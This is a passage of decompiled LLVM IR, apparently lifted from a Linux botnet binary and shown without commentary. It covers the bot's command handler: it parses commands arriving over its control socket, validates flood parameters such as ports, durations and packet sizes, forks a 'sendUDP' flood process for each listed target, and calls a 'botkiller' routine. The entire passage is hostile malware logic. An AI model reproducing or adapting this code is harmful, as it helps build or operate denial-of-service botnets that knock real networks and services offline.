  %v4_804f50c = inttoptr i32 %v2_804f4ef to i8*
  store i32 %v2_804f4ef, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8059975.424 to i32), i32* @edi, align 4
  %v7_804f51e = call i32 @_strncmp(i8* %v4_804f50c, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059975.424, i32 0, i32 0), i32 8)
  %v8_804f51e = urem i32 %v7_804f51e, 2
  %v9_804f51e = icmp eq i32 %v8_804f51e, 0
  %v0_804f520 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f520 = or i1 %v0_804f520, %v9_804f51e
  %v3_804f520 = zext i1 %v2_804f520 to i32
  %v4_804f520 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f520 = and i32 %v4_804f520, -256
  %v6_804f520 = or i32 %v3_804f520, %v5_804f520
  %v7_804f520 = xor i32 %v6_804f520, 1
  store i32 %v7_804f520, i32* @edx, align 4
  %v1_804f528 = trunc i32 %v7_804f520 to i8
  %v3_804f528 = zext i1 %v0_804f520 to i8
  %v15_804f528 = icmp eq i8 %v1_804f528, %v3_804f528
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f531 = icmp eq i1 %v15_804f528, false
  br i1 %v1_804f531, label %dec_label_pc_804f574, label %dec_label_pc_804f533

dec_label_pc_804f533:                             ; preds = %dec_label_pc_804f4ec
  %v0_804f533 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f538 = icmp eq i32 %v0_804f533, 0
  %v1_804f53a = icmp eq i1 %v1_804f538, false
  br i1 %v1_804f53a, label %dec_label_pc_804f574, label %dec_label_pc_804f53c

dec_label_pc_804f53c:                             ; preds = %dec_label_pc_804f533
  %v0_804f53c = load i32, i32* @global_var_80627a8.240, align 8
  %v1_804f544 = call i32 @__GI_inet_ntoa(i32 %v0_804f53c)
  %v0_804f549 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804f549, i32* %edx.global-to-local, align 4
  %v2_804f55e = call i32 @sockprintf(i32 %v0_804f549, i32 ptrtoint ([29 x i8]* @global_var_805997d.425 to i32))
  %v0_804f563 = call i32 @botkiller()
  %v1_804f56f = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f574:                             ; preds = %dec_label_pc_804f533, %dec_label_pc_804f4ec
  %v2_804f577 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f594 = inttoptr i32 %v2_804f577 to i8*
  store i32 %v2_804f577, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_805999a.426 to i32), i32* @edi, align 4
  %v7_804f5a6 = call i32 @_strncmp(i8* %v4_804f594, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805999a.426, i32 0, i32 0), i32 12)
  %v8_804f5a6 = urem i32 %v7_804f5a6, 2
  %v9_804f5a6 = icmp eq i32 %v8_804f5a6, 0
  %v0_804f5a8 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f5a8 = or i1 %v0_804f5a8, %v9_804f5a6
  %v3_804f5a8 = zext i1 %v2_804f5a8 to i32
  %v4_804f5a8 = load i32, i32* @edx, align 4
  %v5_804f5a8 = and i32 %v4_804f5a8, -256
  %v6_804f5a8 = or i32 %v3_804f5a8, %v5_804f5a8
  %v7_804f5a8 = xor i32 %v6_804f5a8, 1
  store i32 %v7_804f5a8, i32* %edx.global-to-local, align 4
  %v1_804f5b0 = trunc i32 %v7_804f5a8 to i8
  %v3_804f5b0 = zext i1 %v0_804f5a8 to i8
  %v15_804f5b0 = icmp eq i8 %v1_804f5b0, %v3_804f5b0
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f5b9 = icmp eq i1 %v15_804f5b0, false
  br i1 %v1_804f5b9, label %dec_label_pc_804f5e7, label %dec_label_pc_804f5bb

dec_label_pc_804f5bb:                             ; preds = %dec_label_pc_804f574
  %v0_804f5bb = load i32, i32* @global_var_80627a8.240, align 8
  %v1_804f5c3 = call i32 @__GI_inet_ntoa(i32 %v0_804f5bb)
  %v0_804f5c8 = load i32, i32* @global_var_805c520.20, align 32
  store i32 %v0_804f5c8, i32* %edx.global-to-local, align 4
  %v2_804f5dd = call i32 @sockprintf(i32 %v0_804f5c8, i32 ptrtoint ([17 x i8]* @global_var_80599a6.427 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804f5e7:                             ; preds = %dec_label_pc_804f574
  %v2_804f5ea = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f607 = inttoptr i32 %v2_804f5ea to i8*
  store i32 %v2_804f5ea, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80599b7.428 to i32), i32* @edi, align 4
  %v7_804f619 = call i32 @_strncmp(i8* %v4_804f607, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80599b7.428, i32 0, i32 0), i32 4)
  %v8_804f619 = urem i32 %v7_804f619, 2
  %v9_804f619 = icmp eq i32 %v8_804f619, 0
  %v0_804f61b = load i1, i1* %cf.global-to-local, align 1
  %v2_804f61b = or i1 %v0_804f61b, %v9_804f619
  %v3_804f61b = zext i1 %v2_804f61b to i32
  %v4_804f61b = load i32, i32* %edx.global-to-local, align 4
  %v5_804f61b = and i32 %v4_804f61b, -256
  %v6_804f61b = or i32 %v3_804f61b, %v5_804f61b
  %v7_804f61b = xor i32 %v6_804f61b, 1
  store i32 %v7_804f61b, i32* %edx.global-to-local, align 4
  %v1_804f623 = trunc i32 %v7_804f61b to i8
  %v3_804f623 = zext i1 %v0_804f61b to i8
  %v15_804f623 = icmp eq i8 %v1_804f623, %v3_804f623
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f62c = icmp eq i1 %v15_804f623, false
  br i1 %v1_804f62c, label %dec_label_pc_804f8f4, label %dec_label_pc_804f632

dec_label_pc_804f632:                             ; preds = %dec_label_pc_804f5e7
  %v9_804f632 = icmp ult i32 %arg1, 5
  store i1 %v9_804f632, i1* %cf.global-to-local, align 1
  %v7_804f636 = icmp sgt i32 %arg1, 5
  br i1 %v7_804f636, label %dec_label_pc_804f63c, label %dec_label_pc_804f6f5

dec_label_pc_804f63c:                             ; preds = %dec_label_pc_804f632
  %v1_804f63f = add i32 %tmp164, 12
  %v5_804f63f = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804f63f, i1* %cf.global-to-local, align 1
  %v1_804f642 = inttoptr i32 %v1_804f63f to i32*
  %v2_804f642 = load i32, i32* %v1_804f642, align 4
  %v1_804f647 = call i32 @atol(i32 %v2_804f642)
  %v5_804f64c = icmp ne i32 %v1_804f647, -1
  store i1 %v5_804f64c, i1* %cf.global-to-local, align 1
  %v10_804f64c = icmp eq i32 %v1_804f647, -1
  br i1 %v10_804f64c, label %dec_label_pc_804f6f5, label %dec_label_pc_804f655

dec_label_pc_804f655:                             ; preds = %dec_label_pc_804f63c
  %v1_804f658 = add i32 %tmp164, 8
  %v5_804f658 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f658, i1* %cf.global-to-local, align 1
  %v1_804f65b = inttoptr i32 %v1_804f658 to i32*
  %v2_804f65b = load i32, i32* %v1_804f65b, align 4
  %v1_804f660 = call i32 @atol(i32 %v2_804f65b)
  %v5_804f665 = icmp ne i32 %v1_804f660, -1
  store i1 %v5_804f665, i1* %cf.global-to-local, align 1
  %v10_804f665 = icmp eq i32 %v1_804f660, -1
  br i1 %v10_804f665, label %dec_label_pc_804f6f5, label %dec_label_pc_804f66e

dec_label_pc_804f66e:                             ; preds = %dec_label_pc_804f655
  %v1_804f671 = add i32 %tmp164, 16
  %v2_804f671 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804f671, i1* %cf.global-to-local, align 1
  %v1_804f674 = inttoptr i32 %v1_804f671 to i32*
  %v2_804f674 = load i32, i32* %v1_804f674, align 4
  %v1_804f679 = call i32 @atol(i32 %v2_804f674)
  %v5_804f67e = icmp ne i32 %v1_804f679, -1
  store i1 %v5_804f67e, i1* %cf.global-to-local, align 1
  %v10_804f67e = icmp eq i32 %v1_804f679, -1
  br i1 %v10_804f67e, label %dec_label_pc_804f6f5, label %dec_label_pc_804f683

dec_label_pc_804f683:                             ; preds = %dec_label_pc_804f66e
  %v1_804f686 = add i32 %tmp164, 20
  %v5_804f686 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804f686, i1* %cf.global-to-local, align 1
  %v1_804f689 = inttoptr i32 %v1_804f686 to i32*
  %v2_804f689 = load i32, i32* %v1_804f689, align 4
  %v1_804f68e = call i32 @atol(i32 %v2_804f689)
  %v5_804f693 = icmp ne i32 %v1_804f68e, -1
  store i1 %v5_804f693, i1* %cf.global-to-local, align 1
  %v10_804f693 = icmp eq i32 %v1_804f68e, -1
  br i1 %v10_804f693, label %dec_label_pc_804f6f5, label %dec_label_pc_804f698

dec_label_pc_804f698:                             ; preds = %dec_label_pc_804f683
  store i1 %v5_804f686, i1* %cf.global-to-local, align 1
  %v2_804f69e = load i32, i32* %v1_804f689, align 4
  %v1_804f6a3 = call i32 @atol(i32 %v2_804f69e)
  %v1_804f6a8 = add i32 %v1_804f6a3, -65536
  %v2_804f6a8 = icmp ult i32 %v1_804f6a3, 65536
  %v3_804f6a8 = sub i32 65535, %v1_804f6a3
  %v4_804f6a8 = and i32 %v3_804f6a8, %v1_804f6a3
  %v5_804f6a8 = icmp slt i32 %v4_804f6a8, 0
  store i1 %v2_804f6a8, i1* %cf.global-to-local, align 1
  %v6_804f6a8 = icmp eq i32 %v1_804f6a8, 0
  %v7_804f6a8 = icmp slt i32 %v1_804f6a8, 0
  %v3_804f6ad = icmp eq i1 %v7_804f6a8, %v5_804f6a8
  %v4_804f6ad = icmp eq i1 %v6_804f6a8, false
  %v5_804f6ad = and i1 %v4_804f6ad, %v3_804f6ad
  br i1 %v5_804f6ad, label %dec_label_pc_804f6f5, label %dec_label_pc_804f6af

dec_label_pc_804f6af:                             ; preds = %dec_label_pc_804f698
  store i1 %v5_804f686, i1* %cf.global-to-local, align 1
  %v2_804f6b5 = load i32, i32* %v1_804f689, align 4
  %v1_804f6ba = call i32 @atol(i32 %v2_804f6b5)
  %v1_804f6bf = add i32 %v1_804f6ba, -65500
  %v5_804f6bf = icmp ult i32 %v1_804f6ba, 65500
  %v6_804f6bf = sub i32 65499, %v1_804f6ba
  %v7_804f6bf = and i32 %v6_804f6bf, %v1_804f6ba
  %v8_804f6bf = icmp slt i32 %v7_804f6bf, 0
  store i1 %v5_804f6bf, i1* %cf.global-to-local, align 1
  %v9_804f6bf = icmp eq i32 %v1_804f6bf, 0
  %v10_804f6bf = icmp slt i32 %v1_804f6bf, 0
  %v3_804f6c4 = icmp eq i1 %v10_804f6bf, %v8_804f6bf
  %v4_804f6c4 = icmp eq i1 %v9_804f6bf, false
  %v5_804f6c4 = and i1 %v4_804f6c4, %v3_804f6c4
  br i1 %v5_804f6c4, label %dec_label_pc_804f6f5, label %dec_label_pc_804f6c6

dec_label_pc_804f6c6:                             ; preds = %dec_label_pc_804f6af
  store i1 %v2_804f671, i1* %cf.global-to-local, align 1
  %v2_804f6cc = load i32, i32* %v1_804f674, align 4
  %v1_804f6d1 = call i32 @atol(i32 %v2_804f6cc)
  %v1_804f6d6 = add i32 %v1_804f6d1, -32
  %v2_804f6d6 = icmp ult i32 %v1_804f6d1, 32
  %v3_804f6d6 = sub i32 31, %v1_804f6d1
  %v4_804f6d6 = and i32 %v3_804f6d6, %v1_804f6d1
  %v5_804f6d6 = icmp slt i32 %v4_804f6d6, 0
  store i1 %v2_804f6d6, i1* %cf.global-to-local, align 1
  %v6_804f6d6 = icmp eq i32 %v1_804f6d6, 0
  %v7_804f6d6 = icmp slt i32 %v1_804f6d6, 0
  %v3_804f6d9 = icmp eq i1 %v7_804f6d6, %v5_804f6d6
  %v4_804f6d9 = icmp eq i1 %v6_804f6d6, false
  %v5_804f6d9 = and i1 %v4_804f6d9, %v3_804f6d9
  br i1 %v5_804f6d9, label %dec_label_pc_804f6f5, label %dec_label_pc_804f6db

dec_label_pc_804f6db:                             ; preds = %dec_label_pc_804f6c6
  %v8_804f6db = icmp ult i32 %arg1, 7
  store i1 %v8_804f6db, i1* %cf.global-to-local, align 1
  %v12_804f6db = icmp eq i32 %arg1, 7
  %v1_804f6df = icmp eq i1 %v12_804f6db, false
  br i1 %v1_804f6df, label %dec_label_pc_804f70f, label %dec_label_pc_804f6e1

dec_label_pc_804f6e1:                             ; preds = %dec_label_pc_804f6db
  %v1_804f6e4 = add i32 %tmp164, 24
  %v5_804f6e4 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f6e4, i1* %cf.global-to-local, align 1
  %v1_804f6e7 = inttoptr i32 %v1_804f6e4 to i32*
  %v2_804f6e7 = load i32, i32* %v1_804f6e7, align 4
  %v1_804f6ec = call i32 @atol(i32 %v2_804f6e7)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp171 = icmp slt i32 %v1_804f6ec, 1
  %tmp172 = icmp eq i1 %tmp171, false
  br i1 %tmp172, label %dec_label_pc_804f70f, label %dec_label_pc_804f6f5

dec_label_pc_804f6f5:                             ; preds = %dec_label_pc_804f632, %dec_label_pc_804f6e1, %dec_label_pc_804f6c6, %dec_label_pc_804f6af, %dec_label_pc_804f698, %dec_label_pc_804f683, %dec_label_pc_804f66e, %dec_label_pc_804f655, %dec_label_pc_804f63c
  %v0_804f6f5 = load i32, i32* @global_var_805c520.20, align 32
  %v2_804f705 = call i32 @sockprintf(i32 %v0_804f6f5, i32 ptrtoint ([113 x i8]* @global_var_80599bc.429 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804f70f:                             ; preds = %dec_label_pc_804f6e1, %dec_label_pc_804f6db
  %v1_804f712 = add i32 %tmp164, 4
  %v1_804f715 = inttoptr i32 %v1_804f712 to i32*
  %v2_804f715 = load i32, i32* %v1_804f715, align 4
  store i1 %v5_804f658, i1* %cf.global-to-local, align 1
  %v2_804f720 = load i32, i32* %v1_804f65b, align 4
  %v1_804f725 = call i32 @atol(i32 %v2_804f720)
  store i1 %v5_804f63f, i1* %cf.global-to-local, align 1
  %v2_804f733 = load i32, i32* %v1_804f642, align 4
  %v1_804f738 = call i32 @atol(i32 %v2_804f733)
  store i1 %v2_804f671, i1* %cf.global-to-local, align 1
  %v2_804f746 = load i32, i32* %v1_804f674, align 4
  %v1_804f74b = call i32 @atol(i32 %v2_804f746)
  store i1 %v5_804f686, i1* %cf.global-to-local, align 1
  %v2_804f759 = load i32, i32* %v1_804f689, align 4
  %v1_804f75e = call i32 @atol(i32 %v2_804f759)
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f76a = icmp sgt i32 %arg1, 6
  br i1 %v7_804f76a, label %dec_label_pc_804f78e, label %dec_label_pc_804f78e.thread

dec_label_pc_804f78e.thread:                      ; preds = %dec_label_pc_804f70f
  store i32 1000, i32* @esi, align 4
  store i1 %v8_804f6db, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804f7bf

dec_label_pc_804f78e:                             ; preds = %dec_label_pc_804f70f
  %v1_804f76f = add i32 %tmp164, 24
  %v5_804f76f = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f76f, i1* %cf.global-to-local, align 1
  %v1_804f772 = inttoptr i32 %v1_804f76f to i32*
  %v2_804f772 = load i32, i32* %v1_804f772, align 4
  %v1_804f777 = call i32 @atol(i32 %v2_804f772)
  store i32 %v1_804f777, i32* @esi, align 4
  store i1 %v8_804f6db, i1* %cf.global-to-local, align 1
  %v7_804f79b = icmp eq i32 %arg1, 7
  br i1 %v7_804f79b, label %dec_label_pc_804f7bf, label %dec_label_pc_804f79d

dec_label_pc_804f79d:                             ; preds = %dec_label_pc_804f78e
  %v1_804f7a0 = add i32 %tmp164, 28
  %v5_804f7a0 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804f7a0, i1* %cf.global-to-local, align 1
  %v1_804f7a3 = inttoptr i32 %v1_804f7a0 to i32*
  %v2_804f7a3 = load i32, i32* %v1_804f7a3, align 4
  %v1_804f7a8 = call i32 @atol(i32 %v2_804f7a3)
  br label %dec_label_pc_804f7bf

dec_label_pc_804f7bf:                             ; preds = %dec_label_pc_804f78e, %dec_label_pc_804f78e.thread, %dec_label_pc_804f79d
  %storemerge10186 = phi i32 [ %v1_804f777, %dec_label_pc_804f79d ], [ %v1_804f777, %dec_label_pc_804f78e ], [ 1000, %dec_label_pc_804f78e.thread ]
  %storemerge9 = phi i32 [ %v1_804f7a8, %dec_label_pc_804f79d ], [ 1000000, %dec_label_pc_804f78e ], [ 1000000, %dec_label_pc_804f78e.thread ]
  store i32 %storemerge9, i32* @edi, align 4
  %v9_804f7c8 = icmp ult i32 %arg1, 8
  store i1 %v9_804f7c8, i1* %cf.global-to-local, align 1
  %v7_804f7cc = icmp sgt i32 %arg1, 8
  br i1 %v7_804f7cc, label %dec_label_pc_804f7ce, label %dec_label_pc_804f7f0

dec_label_pc_804f7ce:                             ; preds = %dec_label_pc_804f7bf
  %v1_804f7d1 = add i32 %tmp164, 32
  %v2_804f7d1 = icmp ugt i32* %arg2, inttoptr (i32 -33 to i32*)
  store i1 %v2_804f7d1, i1* %cf.global-to-local, align 1
  %v1_804f7d4 = inttoptr i32 %v1_804f7d1 to i32*
  %v2_804f7d4 = load i32, i32* %v1_804f7d4, align 4
  %v1_804f7d9 = call i32 @atol(i32 %v2_804f7d4)
  %phitmp = sext i32 %v1_804f7d9 to i64
  br label %dec_label_pc_804f7f0

dec_label_pc_804f7f0:                             ; preds = %dec_label_pc_804f7bf, %dec_label_pc_804f7ce
  %storemerge8 = phi i64 [ %phitmp, %dec_label_pc_804f7ce ], [ 0, %dec_label_pc_804f7bf ]
  %v2_804f807 = inttoptr i32 %v2_804f715 to i8*
  %v3_804f807 = call i32 @__GI_strchr(i8* %v2_804f807, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f80c = icmp eq i32 %v3_804f807, 0
  br i1 %v1_804f80c, label %dec_label_pc_804f89f, label %dec_label_pc_804f814

dec_label_pc_804f814:                             ; preds = %dec_label_pc_804f7f0
  store i32 %v2_804f715, i32* @eax, align 4
  %v2_804f822 = call i32 @__GI_strtok(i32 %v2_804f715, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f89455 = icmp eq i32 %v2_804f822, 0
  %v1_804f89862 = icmp eq i1 %v4_804f89455, false
  br i1 %v1_804f89862, label %dec_label_pc_804f82c, label %dec_label_pc_80502ec

dec_label_pc_804f82c:                             ; preds = %dec_label_pc_804f814, %dec_label_pc_804f87d
  %storemerge1163 = phi i32 [ %v2_804f88c, %dec_label_pc_804f87d ], [ %v2_804f822, %dec_label_pc_804f814 ]
  %v0_804f82c = call i32 @listFork()
  store i32 %v0_804f82c, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f831 = icmp eq i32 %v0_804f82c, 0
  %v1_804f833 = icmp eq i1 %v1_804f831, false
  br i1 %v1_804f833, label %dec_label_pc_804f87d, label %dec_label_pc_804f835

dec_label_pc_804f835:                             ; preds = %dec_label_pc_804f82c
  %v9_804f86c = call i32 @sendUDP(i32 %storemerge1163, i32 %v1_804f725, i32 %v1_804f738, i32 %v1_804f74b, i32 %v1_804f75e, i32 %storemerge10186, i32 %storemerge9, i64 %storemerge8)
  %v1_804f878 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f87d:                             ; preds = %dec_label_pc_804f82c
  %v2_804f88c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f894 = icmp eq i32 %v2_804f88c, 0
  %v1_804f898 = icmp eq i1 %v4_804f894, false
  br i1 %v1_804f898, label %dec_label_pc_804f82c, label %dec_label_pc_80502ec

dec_label_pc_804f89f:                             ; preds = %dec_label_pc_804f7f0
  %v0_804f89f = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f8a4 = icmp eq i32 %v0_804f89f, 0
  %v1_804f8a6 = icmp eq i1 %v1_804f8a4, false
  br i1 %v1_804f8a6, label %dec_label_pc_80502ec, label %dec_label_pc_804f8ac

dec_label_pc_804f8ac:                             ; preds = %dec_label_pc_804f89f
  %v9_804f8e3 = call i32 @sendUDP(i32 %v2_804f715, i32 %v1_804f725, i32 %v1_804f738, i32 %v1_804f74b, i32 %v1_804f75e, i32 %storemerge10186, i32 %storemerge9, i64 %storemerge8)
  %v1_804f8ef = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f8f4:                             ; preds = %dec_label_pc_804f5e7
  %v2_804f8f7 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f914 = inttoptr i32 %v2_804f8f7 to i8*
  store i32 %v2_804f8f7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059a2d.430 to i32), i32* @edi, align 4
  %v7_804f926 = call i32 @_strncmp(i8* %v4_804f914, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059a2d.430, i32 0, i32 0), i32 4)
  %v8_804f926 = urem i32 %v7_804f926, 2
  %v9_804f926 = icmp eq i32 %v8_804f926, 0
  %v0_804f928 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f928 = or i1 %v0_804f928, %v9_804f926
  %v3_804f928 = zext i1 %v2_804f928 to i32
  %v4_804f928 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f928 = and i32 %v4_804f928, -256
  %v6_804f928 = or i32 %v3_804f928, %v5_804f928
  %v7_804f928 = xor i32 %v6_804f928, 1
  store i32 %v7_804f928, i32* @edx, align 4
  %v1_804f930 = trunc i32 %v7_804f928 to i8
  %v3_804f930 = zext i1 %v0_804f928 to i8
  %v15_804f930 = icmp eq i8 %v1_804f930, %v3_804f930
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f939 = icmp eq i1 %v15_804f930, false
  br i1 %v1_804f939, label %dec_label_pc_804fb82, label %dec_label_pc_804f93f

dec_label_pc_804f93f:                             ; preds = %dec_label_pc_804f8f4
  %v9_804f93f = icmp ult i32 %arg1, 5
  store i1 %v9_804f93f, i1* %cf.global-to-local, align 1
  %v7_804f943 = icmp sgt i32 %arg1, 5
  br i1 %v7_804f943, label %dec_label_pc_804f949, label %dec_label_pc_804f9d1

dec_label_pc_804f949:                             ; preds = %dec_label_pc_804f93f
  %v1_804f94c = add i32 %tmp164, 12
  %v5_804f94c = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804f94c, i1* %cf.global-to-local, align 1
  %v1_804f94f = inttoptr i32 %v1_804f94c to i32*
  %v2_804f94f = load i32, i32* %v1_804f94f, align 4
  %v1_804f954 = call i32 @atol(i32 %v2_804f94f)
  %v5_804f959 = icmp ne i32 %v1_804f954, -1
  store i1 %v5_804f959, i1* %cf.global-to-local, align 1
  %v10_804f959 = icmp eq i32 %v1_804f954, -1
  br i1 %v10_804f959, label %dec_label_pc_804f9d1, label %dec_label_pc_804f95e

dec_label_pc_804f95e:                             ; preds = %dec_label_pc_804f949
  %v1_804f961 = add i32 %tmp164, 8
  %v5_804f961 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f961, i1* %cf.global-to-local, align 1
  %v1_804f964 = inttoptr i32 %v1_804f961 to i32*
  %v2_804f964 = load i32, i32* %v1_804f964, align 4
  %v1_804f969 = call i32 @atol(i32 %v2_804f964)
  %v5_804f96e = icmp ne i32 %v1_804f969, -1
  store i1 %v5_804f96e, i1* %cf.global-to-local, align 1
  %v10_804f96e = icmp eq i32 %v1_804f969, -1
  br i1 %v10_804f96e, label %dec_label_pc_804f9d1, label %dec_label_pc_804f973

dec_label_pc_804f973:                             ; preds = %dec_label_pc_804f95e
  %v1_804f976 = add i32 %tmp164, 16
  %v2_804f976 = icmp ugt i32* %arg2, inttoptr (i32 -17 to i32*)
  store i1 %v2_804f976, i1* %cf.global-to-local, align 1
  %v1_804f979 = inttoptr i32 %v1_804f976 to i32*
  %v2_804f979 = load i32, i32* %v1_804f979, align 4
  %v1_804f97e = call i32 @atol(i32 %v2_804f979)
  %v5_804f983 = icmp ne i32 %v1_804f97e, -1
  store i1 %v5_804f983, i1* %cf.global-to-local, align 1
  %v10_804f983 = icmp eq i32 %v1_804f97e, -1
  br i1 %v10_804f983, label %dec_label_pc_804f9d1, label %dec_label_pc_804f988

dec_label_pc_804f988:                             ; preds = %dec_label_pc_804f973
  store i1 %v2_804f976, i1* %cf.global-to-local, align 1
  %v2_804f98e = load i32, i32* %v1_804f979, align 4
  %v1_804f993 = call i32 @atol(i32 %v2_804f98e)
  %v1_804f998 = add i32 %v1_804f993, -32
  %v2_804f998 = icmp ult i32 %v1_804f993, 32
  %v3_804f998 = sub i32 31, %v1_804f993
  %v4_804f998 = and i32 %v3_804f998, %v1_804f993
  %v5_804f998 = icmp slt i32 %v4_804f998, 0
  store i1 %v2_804f998, i1* %cf.global-to-local, align 1
  %v6_804f998 = icmp eq i32 %v1_804f998, 0
  %v7_804f998 = icmp slt i32 %v1_804f998, 0
  %v3_804f99b = icmp eq i1 %v7_804f998, %v5_804f998
  %v4_804f99b = icmp eq i1 %v6_804f998, false
  %v5_804f99b = and i1 %v4_804f99b, %v3_804f99b
  br i1 %v5_804f99b, label %dec_label_pc_804f9d1, label %dec_label_pc_804f99d

dec_label_pc_804f99d:                             ; preds = %dec_label_pc_804f988
  store i1 false, i1* %cf.global-to-local, align 1
  %v7_804f9a1 = icmp sgt i32 %arg1, 6
  br i1 %v7_804f9a1, label %dec_label_pc_804f9a3, label %dec_label_pc_804f9b7

dec_label_pc_804f9a3:                             ; preds = %dec_label_pc_804f99d
  %v1_804f9a6 = add i32 %tmp164, 24
  %v5_804f9a6 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804f9a6, i1* %cf.global-to-local, align 1
  %v1_804f9a9 = inttoptr i32 %v1_804f9a6 to i32*
  %v2_804f9a9 = load i32, i32* %v1_804f9a9, align 4
  %v1_804f9ae = call i32 @atol(i32 %v2_804f9a9)
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804f9b3 = icmp slt i32 %v1_804f9ae, 0
  br i1 %v2_804f9b3, label %dec_label_pc_804f9d1, label %dec_label_pc_804f9b7

dec_label_pc_804f9b7:                             ; preds = %dec_label_pc_804f99d, %dec_label_pc_804f9a3
  %v8_804f9b7 = icmp ult i32 %arg1, 8
  store i1 %v8_804f9b7, i1* %cf.global-to-local, align 1
  %v12_804f9b7 = icmp eq i32 %arg1, 8
  %v1_804f9bb = icmp eq i1 %v12_804f9b7, false
  br i1 %v1_804f9bb, label %dec_label_pc_804f9eb, label %dec_label_pc_804f9bd

dec_label_pc_804f9bd:                             ; preds = %dec_label_pc_804f9b7
  %v1_804f9c0 = add i32 %tmp164, 28
  %v5_804f9c0 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804f9c0, i1* %cf.global-to-local, align 1
  %v1_804f9c3 = inttoptr i32 %v1_804f9c0 to i32*
  %v2_804f9c3 = load i32, i32* %v1_804f9c3, align 4
  %v1_804f9c8 = call i32 @atol(i32 %v2_804f9c3)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp173 = icmp slt i32 %v1_804f9c8, 1
  %tmp174 = icmp eq i1 %tmp173, false
  br i1 %tmp174, label %dec_label_pc_804f9eb, label %dec_label_pc_804f9d1

dec_label_pc_804f9d1:                             ; preds = %dec_label_pc_804f93f, %dec_label_pc_804f9bd, %dec_label_pc_804f9a3, %dec_label_pc_804f988, %dec_label_pc_804f973, %dec_label_pc_804f95e, %dec_label_pc_804f949
  %v0_804f9d1 = load i32, i32* @global_var_805c520.20, align 32
  %v2_804f9e1 = call i32 @sockprintf(i32 %v0_804f9d1, i32 ptrtoint ([186 x i8]* @global_var_8059a34.431 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804f9eb:                             ; preds = %dec_label_pc_804f9bd, %dec_label_pc_804f9b7
  %v1_804f9ee = add i32 %tmp164, 4
  %v1_804f9f1 = inttoptr i32 %v1_804f9ee to i32*
  %v2_804f9f1 = load i32, i32* %v1_804f9f1, align 4
  store i1 %v5_804f961, i1* %cf.global-to-local, align 1
  %v2_804f9fc = load i32, i32* %v1_804f964, align 4
  %v1_804fa01 = call i32 @atol(i32 %v2_804f9fc)
  store i1 %v5_804f94c, i1* %cf.global-to-local, align 1
  %v2_804fa0f = load i32, i32* %v1_804f94f, align 4
  %v1_804fa14 = call i32 @atol(i32 %v2_804fa0f)
  store i1 %v2_804f976, i1* %cf.global-to-local, align 1
  %v2_804fa22 = load i32, i32* %v1_804f979, align 4
  %v1_804fa27 = call i32 @atol(i32 %v2_804fa22)
  %v1_804fa32 = add i32 %tmp164, 20
  %v1_804fa35 = inttoptr i32 %v1_804fa32 to i32*
  %v2_804fa35 = load i32, i32* %v1_804fa35, align 4
  store i1 %v8_804f9b7, i1* %cf.global-to-local, align 1
  br i1 %v1_804f9bb, label %dec_label_pc_804fa62, label %dec_label_pc_804fa40

dec_label_pc_804fa40:                             ; preds = %dec_label_pc_804f9eb
  %v1_804fa43 = add i32 %tmp164, 28
  %v5_804fa43 = icmp ugt i32* %arg2, inttoptr (i32 -29 to i32*)
  store i1 %v5_804fa43, i1* %cf.global-to-local, align 1
  %v1_804fa46 = inttoptr i32 %v1_804fa43 to i32*
